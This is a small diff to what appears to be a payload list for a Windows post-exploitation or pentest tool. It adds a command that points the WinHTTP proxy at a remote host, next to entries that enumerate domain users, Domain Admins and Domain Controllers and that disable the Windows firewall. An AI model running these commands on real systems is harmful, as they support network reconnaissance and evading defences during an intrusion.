@@ -140,6 +140,7 @@ Load({payload: "net user /domain", desc: "Lists all of the domain users", catego
 Load({payload: "net group \"Domain Admins\" /domain", desc: "Prints list of Domain Admins", category: "Networking"})
 Load({payload: "net group \"Domain Controllers\" /domain", desc: "Prints the list of Domain Controllers for the current domain", category: "Networking"})
 Load({payload: "netsh firewall set opmode disable", desc: "Disable Windows Firewall", category: "Networking"})
+Load({payload: "netsh winhttp set proxy \"<RHOST (ex: proxy.foobar.com:8080)>\"", desc: "Configure an HTTP Proxy", category: "Networking"})
 
 // ################### WMIC ######################
 
